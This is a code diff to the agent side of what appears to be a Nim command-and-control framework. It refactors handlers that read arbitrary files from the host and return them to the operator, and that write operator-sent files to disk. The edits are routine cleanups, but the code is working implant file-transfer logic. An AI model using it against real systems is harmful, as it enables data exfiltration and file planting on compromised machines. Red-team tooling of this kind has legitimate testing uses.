@@ -40,15 +40,16 @@ when not defined(agent):
 
 when defined(agent):
 
-    import os, std/paths, strutils, strformat
+    import os, std/paths, strformat
+    import ../agent/utils/io
     import ../agent/protocol/result
-    import ../common/[utils, serialize]
+    import ../common/serialize
 
     proc executeDownload(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
             var filePath: string = absolutePath(Bytes.toString(task.args[0].data)) 
 
-            echo fmt"   [>] Downloading {filePath}"
+            print fmt"   [>] Downloading {filePath}"
 
             # Read file contents into memory and return them as the result 
             var fileBytes = readFile(filePath)
@@ -59,9 +60,9 @@ when defined(agent):
             packer.addDataWithLengthPrefix(string.toBytes(filePath))
             packer.addDataWithLengthPrefix(string.toBytes(fileBytes))
 
-            let result = packer.pack() 
+            let data = packer.pack() 
 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, result)
+            return createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, data)
 
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
@@ -71,7 +72,7 @@ when defined(agent):
         try: 
             var arg: string = Bytes.toString(task.args[0].data) 
 
-            echo arg
+            print arg
 
             # Parse binary argument
             var unpacker = Unpacker.init(arg) 
@@ -83,7 +84,7 @@ when defined(agent):
             let destination = fmt"{paths.getCurrentDir()}\{fileName}"
             writeFile(fmt"{destination}", fileContents)
 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"File uploaded to {destination}." & "\n"))
+            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"File uploaded to {destination}."))
 
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
